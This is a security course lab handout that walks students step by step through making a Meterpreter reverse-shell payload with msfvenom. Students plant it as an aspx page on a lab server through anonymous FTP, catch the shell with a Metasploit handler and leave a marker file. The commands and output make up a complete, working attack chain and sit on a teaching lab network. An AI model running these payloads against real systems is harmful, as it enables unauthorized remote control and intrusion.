====== Lab 1 ======

===== Remote Access Trojan - Getting A Reverse Shell =====

==== Overview ====
	As we discovered during our discussion on Malware, a Trojan is a program that contains malicious or harmful code inside apparently harmless programming or data in such a way that it can get control and cause damage, such as ruining the file allocation table on a hard drive. The objective of this lab is to have you create a RAT with the capability to provide you with a reverse shell so that you can gain access to a remote system.


==== Objectives ====
	Create the RAT payload with msfvenom.
	Upload the RAT via a misconfigured file server.
	Execute the payload as an executable web page.
	Gain a reverse shell to access the remote server.

==== TODO ====

	1. Let's create a Reverse Shell RAT using the MetaSploit Framework. From the same Terminal you've been working in, execute the following commands: Note: Substitute X with your Host IP in LHOST.
	
{{{code: lang="sh" linenumbers="True"
root@kali:# msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.1.X LPORT=4444 -f aspx > <suid>.aspx
}}}
	

	2. Start a Meterpreter Session in Kali.
{{{code: lang="sh" linenumbers="True"
root@kali:# /etc/init.d/postgresql start
root@kali:# msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options
msf5 exploit(multi/handler) > set LHOST <your_vm_ip>
msf5 exploit(multi/handler) > set LPORT 4444
msf5 exploit(multi/handler) > run

[-] Handler started bind to 172.16.170.142:4444:-  -
[*] Started reverse TCP handler on 172.16.170.142:4444 
}}}
	

	3. FTP our RAT to the vulnerable system.
{{{code: lang="sh" linenumbers="True"
root@kali:# ftp 172.16.1.29Name (172.16.1.29:root): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.

User: anonymous
Pass: <no_pass>

ftp> put <suid>.aspx
ftp> quit
}}}
	

	4. Execute your RAT by visiting http://172.16.1.29/<suid>.aspx
	5. You should see a Reverse Connection back to your Meterpreter handler.
	6. Type help to see all available commands.
{{{code: lang="sh" linenumbers="True"
meterpreter > help

meterpreter > shell
Process 4904 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
}}}
	

	7. After you migrate to a "shell" navigate to the Public user's home directory and leave your mark.
{{{code: lang="sh" linenumbers="True"
>cd c:\Users\Public 
C:\Users\Public> echo "<hacker_handle> was here!" > <suid>.txt
}}}
	

	8. Have the instructor verify that you've successfully compromised the Server. And you're done!!
